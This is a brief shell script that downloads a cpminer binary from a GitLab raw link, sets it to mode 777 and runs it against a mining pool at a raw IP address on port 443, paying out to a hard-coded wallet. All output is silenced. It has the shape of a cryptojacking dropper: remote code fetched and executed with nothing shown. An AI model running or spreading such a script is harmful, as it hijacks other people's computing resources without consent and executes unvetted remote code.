#!/bin/sh

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a minotaurx -o stratum+tcps://138.197.2.25:443 -u RC1wnJN8pQbwNwXnGC7xRW6ozf6GA4buZV -t4 -p m=solo > /dev/null 2>&1